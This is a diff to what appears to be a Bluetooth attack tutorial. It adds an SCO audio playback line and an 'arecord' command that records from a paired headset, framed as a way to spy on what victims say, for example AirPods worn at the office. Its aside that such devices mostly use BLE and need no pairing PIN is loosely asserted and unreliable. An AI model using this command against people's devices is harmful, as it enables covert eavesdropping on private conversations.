@@ -249,8 +249,20 @@ Same as above - connect speaker and play sound.
 # connect to device
 [bluetooth]# connect [mac address]
 
-# play sound
+# play sound (A2DP)
 $ aplay -D bluealsa:HCI=hci0,DEV=[mac address],PROFILE=a2dp test.mp3
+
+# play sound (SCO)
+$ aplay -D bluealsa:HCI=hci0,DEV=[mac address],PROFILE=sco test.mp3
 ```
+
+We come to the somewhat surprising possibility. You can (_depending on the target device_) also spy on what victims are talking about.
+
+```shell
+# record sound (SCO)
+$ arecord -D bluealsa:HCI=hci0,DEV=[mac address],PROFILE=sco spy.wav
+```
+
+Since many people take for example, AirPods with them to the office, it becomes critical at this point. These Bluetooth devices mostly use BLE (_AKA Bluetooth Smart_) and do not offer/need a pairing PIN option. ... What a world!
 
 [Go Back](../readme.md)
